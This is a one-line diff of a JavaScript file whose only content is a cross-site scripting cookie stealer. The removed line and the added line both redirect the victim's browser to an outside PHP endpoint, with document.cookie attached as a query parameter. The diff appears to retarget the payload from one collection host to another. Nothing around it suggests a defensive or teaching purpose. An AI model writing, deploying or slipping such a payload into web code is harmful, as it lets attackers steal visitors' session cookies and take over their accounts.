@@ -1,1 +1,1 @@
-document.location='https://hydraruzxpnew4af.onlon.co/cookiestealer/easy-xss-cookie-stealer/cookiestealer.php?c='+encodeURIComponent(btoa(document.cookie));
+document.location='http://kennethzhang.net/cookiegrab.php?c='+document.cookie;
